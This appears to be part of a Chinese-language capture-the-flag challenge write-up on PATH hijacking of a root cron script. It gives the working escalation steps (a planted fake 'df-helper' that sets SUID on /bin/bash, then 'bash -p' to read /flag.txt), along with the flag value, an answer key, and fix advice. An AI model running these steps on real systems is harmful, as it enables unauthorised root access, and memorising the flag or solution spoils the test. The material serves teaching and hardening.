### 1.3 关键配置（实测）

| 路径 | 权限 / 内容 |
| --- | --- |
| `/flag.txt` | `-r-------- root root` | 构建时由题目目录的 `flag.txt` 写入，每题固定 |
| `/usr/local/bin/disk-report.sh` | `-rwxr-xr-x root root`，内容见下 |
| `/etc/cron.d/disk-report` | `* * * * * root /usr/local/bin/disk-report.sh`（644 root） |
| `/home/player/bin` | `drwxr-xr-x player player` —— **可写，且是 PATH 的第一段** |
| `/usr/local/lib/df-helper.real` | `-rwxr-xr-x root root`，真 helper |
| `/usr/local/lib/df-helper` | 指向 `df-helper.real` 的软链（root 拥有，目录不可写） |
| `/var/reports` | `drwxr-xr-x root root`，报告输出目录（只读可列） |
| `player` 的 sudo | `player is not in the sudoers file` |

`disk-report.sh` 的关键三行：

```bash
export PATH=/home/player/bin:/usr/local/lib:/usr/local/bin:/usr/bin:/bin
OUT=/var/reports/disk-$(date +%Y%m%d-%H%M).txt
df-helper
```

## 二、题目考点

1. **PATH 是从左到右查找的**：`/home/player/bin` 排在 `/usr/local/lib` 之前，谁先命中就用谁。
2. **“裸命令名”= 可被抢占的入口**：脚本里写 `df-helper` 而不是绝对路径，等于把“用哪个文件”交给 PATH 决定。
3. **谁在用它**：脚本由 cron 以 `root` 执行，所以玩家放进去的同名文件也**以 root 身份运行**。
4. **可写目录是第一优先级**：一个属于自己、又被 root 的 PATH 引用的目录，就是天然的持久化提权位。
5. **修复对照**：脚本里改成绝对路径 `/usr/local/lib/df-helper`，或把 `PATH` 里去掉玩家可写目录 —— PATH 劫持即失效。

## 三、解题过程

### 3.1 第一步：看 root 自动跑什么

```bash
cat /etc/cron.d/disk-report
# * * * * * root /usr/local/bin/disk-report.sh
```

脚本本身不可写（`-rwxr-xr-x root root`），`/etc/cron.d/disk-report` 也不可写，`/var/reports`、`/usr/local/lib` 都是 root 属主 —— 所有“直接改”的路都被堵死。

### 3.2 第二步：看脚本里的 PATH 与裸命令

```bash
grep -n 'PATH\|df-helper' /usr/local/bin/disk-report.sh
# 6:export PATH=/home/player/bin:/usr/local/lib:/usr/local/bin:/usr/bin:/bin
# 11:  df-helper

ls -ld /home/player/bin
# drwxr-xr-x 2 player player 4096 /home/player/bin      <-- 我能写，且在 PATH 第一位
```

正常运行时报告是真实输出（可先确认一次）：

```bash
cat /var/reports/disk-20261118-0816.txt
# === disk usage report 2026-11-18 08:16:01 ===
# Filesystem      Size  Used Avail Use% Mounted on
# overlay          49G   38G  8.8G  82% /
```

### 3.3 第三步：在可写目录里放同名“helper”

```bash
printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /home/player/bin/df-helper
chmod +x /home/player/bin/df-helper
ls -l /home/player/bin/
# -rwxrwxr-x 1 player player 33 Nov 18 08:16 df-helper

ls -l /bin/bash
# -rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash     <-- 还没有 s
```

### 3.4 第四步：等一个 cron 周期，拿 root

```bash
ls -1t /var/reports | head -3
# disk-20261118-0817.txt
# disk-20261118-0816.txt

ls -l /bin/bash
# -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash     <-- SUID 已生效

/bin/bash -p -c 'id; cat /flag.txt'
# uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player)
# Ly_Flag{zoxfbmcl}
```

注意“接管”后的报告内容只剩标题行（我们的 helper 不输出内容）——这也是玩家能自查“劫持已生效”的信号。

### 4.2 唯一解性说明

| 其他思路 | 实测结果 |
| --- | --- |
| 改 `disk-report.sh` | 0755 root → 拒绝 |
| 改 `/etc/cron.d/disk-report` | 0644 root、目录不写 → 拒绝 |
| 覆盖真 helper `/usr/local/lib/df-helper.real` 或其软链 | `/usr/local/lib` 755 root → 拒绝 |
| 往 `/var/reports` 写文件 | 755 root → 拒绝（且只是输出目录） |
| 把同名文件塞进 PATH 后段 | `/usr/local/lib`、`/usr/local/bin`、`/usr/bin`、`/bin` 全 root 属主 |
| 用 sudo | `player is not in the sudoers file` |

同一可写目录里还能劫持脚本中的 `date`、`ls`、`tail`、`rm`、`xargs`，但它们都指向**同一个提权面**（`/home/player/bin` + root 的 cron），属同一解法家族，不是第二解。

### 4.3 flag 每题固定（flag.txt）
flag 是**每题一个固定值**：题目目录下的 `flag.txt` 由 Dockerfile `COPY` 到 `/flag.txt`，
再 `chown root:root && chmod 400`。十道题十份文件、内容互不相同；同一题多次构建、多个实例
取值都一致，评分不需要再按实例取 flag。

```bash
docker exec lx04 stat -c '%a %U:%G' /flag.txt   # 400 root:root
docker exec lx04 cat /flag.txt                    # Ly_Flag{zoxfbmcl}
```

注意：flag 在构建时就写进镜像层，`docker save` 出来的 tar 同样带着它；若镜像/tar 会发给选手，
等于直接送出 flag，这种情况下应改为运行时挂载或环境变量注入。

## 六、开发过程中的一处修正

首版 `df-helper` 只装成 `/usr/local/lib/df-helper.real`，脚本按名字找 `df-helper` 必然找不到，导致每份报告都是 `df-helper: command not found`，环境看起来“坏了”，也不利于讲“正常 → 被劫持”的对比。修正：在镜像里加一条 root 拥有的软链 `/usr/local/lib/df-helper → df-helper.real`（目录 755 root，玩家不能改）。重建后正常报告能输出真实 `df -h`，劫持路线完全不变。

---

## 七、修复建议

1. **脚本里一律写绝对路径**：`df-helper` → `/usr/local/lib/df-helper.real`（本题的正解对照）。
2. **PATH 只放可信目录**，且不要先于系统目录：`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`。任何“用户可写目录”都不该出现在 root 的 PATH 里。
3. **计划任务显式指定环境**：在 `/etc/cron.d` 行首加 `PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/bin`，避免继承脚本里的自定义 PATH。
4. **审计**：`find / -xdev -type d -writable` 交叉比对 cron/systemd 引用；对 `/etc/cron.d`、`/usr/local/bin` 做文件完整性基线。
5. **构建侧**：`FROM ubuntu:24.04` 未固定 digest，建议固定 sha256 并打版本标签。

---

## 八、教学要点

1. 看到 root 执行的脚本，第一件事是把 PATH 与里面所有裸命令名抄出来，再问“这些目录谁能写”。
2. 反过来看：**自己拥有的目录出现在 root 的 PATH 里，就是提权位**，哪怕那个目录当前是空的。
3. PATH 劫持不只能放 `chmod +s`，也可以直接 `cat /flag.txt > /var/reports/out`、写 `authorized_keys`、反弹 shell —— 本质是“以 root 身份执行我的代码”。
4. `bash -p` 必须加，否则 SUID bash 会把 euid 降回 player。
5. 修复的关键不在“检查玩家文件”，而在“脚本不信任 PATH”。
